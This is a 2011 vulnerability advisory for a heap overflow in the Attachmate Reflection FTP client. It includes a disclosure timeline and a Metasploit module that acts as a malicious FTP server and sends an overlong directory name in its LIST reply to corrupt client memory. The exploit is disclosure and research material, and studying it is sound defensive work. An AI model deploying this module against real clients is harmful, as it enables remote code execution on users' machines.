Application:   Attachmate Reflection FTP Client Heap Overflow
Platforms:   Windows
Exploitation:   Remote code execution
CVE Number: 
{PRL}:   2011-09
Author:   Francis Provencher (Protek Research Lab&#039;s)
Website:   http://www.protekresearchlab.com/
Twitter:   @ProtekResearch
#####################################################################################
1) Introduction
2) Timeline
3) Technical details
4) PoC
#####################################################################################
 
===============
1) Introduction
===============
 
Attachmate Corporation is a software company owned by an investment group led by Francisco Partners,
Golden Gate Capital, and Thoma Cressey Bravo. Attachmate focuses on terminal emulation, legacy modernization,
managed file transfer, and enterprise fraud management software. Attachmate Corporation is a principal holding
within The Attachmate Group. In addition to Attachmate Corporation, The Attachmate Group&#039;s other principal
holdings include NetIQ, Novell, and SUSE.
 
#####################################################################################
============================
2) Timeline
============================
 
2011-09-26 - Vulnerability reported to vendor
2011-11-16 - Coordinated public release of advisory
 
#####################################################################################
============================
3) Technical details
============================
 
The Reflection FTP client, didn&#039;t validate the maximum length of a directory when a LIST command is issuing.
An overly long directory name can overflow the heap and corrupt memory.
 
 
#####################################################################################
 
===========
4) The Code
===========
 
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::Remote::FtpServer
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Attachmate Reflection FTP Client Heap Overflow (LIST)&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits an heap buffer overflow in Attachmate Reflection FTP Client,
                triggered when processing the response on a LIST command.
            },
            &#039;Author&#039;     =>
                [
                    &#039;Francis Provencher&#039;,      
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => "$Revision: 12196 $",
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.protekresearchlab.com/&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\xff\x0d\x5c\x2f\x0a",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;XP SP3 Universal&#039;, { &#039;Offset&#039; => 300, } ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;November 16 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
    end
 
    def setup
        super
    end
 
    def on_client_unknown_command(c,cmd,arg)
        c.put("200 OK\r\n")
    end
 
    def on_client_command_list(c,arg)
 
        conn = establish_data_connection(c)
        if(not conn)
            c.put("425 Can&#039;t build data connection\r\n")
            return
        end
        print_status(" - Data connection set up")
        code = 150
        c.put("#{code} Here comes the directory listing.\r\n")
        code = 226
        c.put("#{code} Directory send ok.\r\n")
 
        filename = "A" * 296
 
        junk = "DCBA"
 
        buffer = filename + junk
        print_status(" - Sending directory list via data connection")
        dirlist = "-rw-rw-r--    1 1176     1176         1060 sep 27 22:22 #{buffer}\r\n"
        conn.put(dirlist)
        conn.close
        print_status(" Movzx eax, byte ptr edx ds:0023:41424344  ...")
        return
 
    end
 
end



